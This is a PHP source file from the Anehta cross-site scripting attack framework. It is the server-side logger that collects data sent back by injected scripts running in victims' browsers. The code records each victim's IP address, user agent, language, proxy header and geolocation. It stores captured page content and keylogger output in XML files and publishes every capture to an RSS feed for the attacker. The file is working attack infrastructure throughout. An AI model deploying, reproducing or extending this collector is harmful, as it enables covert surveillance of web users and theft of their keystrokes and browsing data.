<?php
// 记录抓取的信息
// Author: axis

// 将slave信息存储到xml文件中
require("xml.php");

//加载RSS类
include_once("class/RSS_Class.php");

//加载XML解析类
include_once("class/xml_Class.php");

// 加载XSS过滤库
require_once ("../server/safe_php/Safe.php");
$parser =& new HTML_Safe();

//date_default_timezone_set(date_default_timezone_get());
date_default_timezone_set('Asia/Shanghai');




/*******************************************************
* 获取一般信息
********************************************************/
//请求时间
//$requestDate = date("m/d/Y H:i:s");
$requestDate = date(DATE_RFC822);
//获取IP
$slaveIP = $_SERVER['REMOTE_ADDR'];
// 浏览器和系统版本
$slaveUA = $_SERVER['HTTP_USER_AGENT'];
// 语言
$slaveLang = $_SERVER['HTTP_ACCEPT_LANGUAGE'];

$slaveProxy = "";
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){ 
  $slaveProxy = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
//查询地理位置
require("ip.php");
$slaveLocation = ip2location($slaveIP);
$slaveLocation = iconv("gbk","utf-8",$slaveLocation); 

$qstr = $_SERVER['QUERY_STRING'];  // XSS传回的数据

if ($qstr == ""){ // logCache() POST 回来的数据
	//$qstr = $_POST['anehtaInput_anehtaPostLogger'];
	if (!empty($_POST['anehtaInput_anehtaPostLogger'])){
		$qstr = urldecode($_POST['anehtaInput_anehtaPostLogger']);
	}
	else if (!empty($_POST['anehtaInput_anehtaPostKeylog'])){
		$qstr = urldecode($_POST['anehtaInput_anehtaPostKeylog']);
	}
	else if (!empty($_POST['anehtaInput_anehtaPostClientProxy'])){ // clientproxy, 专门存到clientproxy.xml中
		$fpath = "../slave/clientproxy.xml";
    $clientProxy = new OpXML('clientProxy',$fpath);
    
    /*
    // safephp一次，过滤XSS
    $qstr = urldecode($_POST['anehtaInput_anehtaPostClientProxy']);
    $qstr = $parser->parse($qstr);
    $parser->clear();    
    
    // 重新编码$qstr
    $qstr = urlencode($qstr);
    */
    $qstr = htmlentities($_POST['anehtaInput_anehtaPostClientProxy']);
    //echo $qstr;
    //增加记录
    $arr = array('pageContent'=>"\r\n<![CDATA[\r\n".$qstr."\r\n]]>\r\n");

    if ($clientProxy->getRecordById(1)){    
    	$clientProxy->updateRecordById(1, $arr);            
    } else {
    	$clientProxy->insert($arr);
    }
		exit;
	}	
}



/*******************************************************
* 解码并去除[NoCryptMark]
********************************************************/
// 使用strpos 而不是 strchr ,因为更快,消耗内存更小
if ( strpos($qstr, "NoCryptMark") === false ){
	$qstr = base64_decode($qstr); // 解码base64	
	$qstr = urldecode($qstr);
}
else {
	$qstr = urldecode(strchr($qstr, "[NoCryptMark]"));
	$qstr = substr($qstr, 13);
}



/*******************************************************
* 开始分离出水印
********************************************************/

// 判断水印为null的情况
$slaveWatermark = strchr($qstr, "[**** Watermark: null");
if ( $slaveWatermark == false){ // 说明有水印
  // 分离出水印
  $slaveWatermark = strchr($qstr, "[**** Watermark: ");
  $slaveWatermark = strchr($slaveWatermark, "|");

  // 分离出watermark(随机的时间值)
  $slaveWatermark = substr($slaveWatermark, 1, 13);
  
}
else { // 水印为null的
	$slaveWatermark = "null";
}


/*******************************************************
* 处理$qstr, 使之符合正确的格式
********************************************************/
// 去掉qstr前面的水印，保留后面的数据
$qstr = strchr($qstr, " ****]");
$qstr = substr($qstr, 6);

// 下面去掉$qstr 里的 " [anehtaCacheSplit] "
$qstr = str_replace(" [anehtaCacheSplit] ", "", $qstr);




/*******************************************************
* 先从$qstr 中取出一些有用信息
********************************************************/
$tmp = explode("</requestURI>", $qstr);
$tmp = explode("<![CDATA[", $tmp[0]);
$tmp = explode("\r\n]]>\r\n", $tmp[1]);

$requestURI = $tmp[0];

$tmp = explode("/", $tmp[0]); // 切分uri
$xssDomain = $tmp[2];

$tmp = "";

//$getData = XML_unserialize($test);
//print_r($getData);


/*******************************************************
* 开始存储数据到xml文件
********************************************************/
$fpath = "../slave/slave.xml";
$slaveData = new OpXML('slaveData',$fpath);

//增加一条记录
$arr = array('requestDate'=>$requestDate,
             'slaveWatermark'=>$slaveWatermark,
             'slaveIP'=>$slaveIP,
             'slaveUA'=>$slaveUA,
             'slaveLang'=>$slaveLang,
             'slaveProxy'=>$slaveProxy,
             'slaveLocation'=>$slaveLocation,             
             //'qstr'=>"\r\n<![CDATA[\r\n".$qstr."\r\n]]>\r\n"   
             'xssGot'=>$qstr     // 未检查具体数据的 CDATA，可能被注入参数
             );

$slaveData->insert($arr);

     

/*******************************************************
* 生成rss feed
********************************************************/
$myFeed = new RSSFeed();

$myFeed->addChannel( "Anehta!", "http://anehta.googlecode.com", "Anehta Slave Events!", "zh-cn" );


// 下面去掉$qstr 里的 "<![CDATA["和 "]]>"
$qstr = str_replace("\r\n<![CDATA[\r\n", "", $qstr);
$qstr = str_replace("\r\n]]>\r\n", "", $qstr);


/**
 * Encodes HTML safely for UTF-8. Use instead of htmlentities.
 *
 * @param string $var
 * @return string
 */
function html_encode($var)
{
	return htmlentities($var, ENT_QUOTES, 'UTF-8') ;
}
$qstr = html_encode($qstr);


$rand_val = mt_rand(); // 生成一个随机数

$myFeed->appendFeedItem( "Slave_".$myFeed->XmlEncode($slaveWatermark)." From ".$slaveIP,   // title
			"Slave_".$myFeed->XmlEncode($slaveWatermark)."@".$xssDomain,                         // author
			$myFeed->XmlEncode($slaveLocation),                                                  // category
			$myFeed->XmlEncode($requestURI),                                                     // item link
			$myFeed->XmlEncode($requestURI)."#".$rand_val,                                       // item guid
			$qstr,                                                           // item description
			$requestDate );                                                  // pubDate

// 写入rss文件 rss.xml
$myFeed->releaseFeed();

?>